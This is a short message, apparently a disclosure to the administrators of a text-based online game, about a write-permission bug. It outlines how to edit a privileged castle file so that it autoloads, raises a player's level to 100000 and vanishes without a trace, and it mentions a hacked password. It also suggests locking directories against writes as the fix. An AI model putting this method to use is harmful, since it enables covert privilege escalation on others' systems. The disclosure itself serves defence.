You can see the mechanics of how this file works- It is not a complete
example but it 'edits' a player's level to 100000. All one needs to do is
to edit /players/boltar/castle and make it autoload, do its work, and
disappear without a trace.

Psykosis had the right tool to do it in the form of Glaendor's hacked
password, but he had no knowledge of this bug then.

The only way this can be prevented is to make modifications to the
functions that checks a valid write to lock out your directories from ANY
writes...

Shrug.. I thought I should let you know this because when it was explained to
me my jaw dropped and i turned pale.
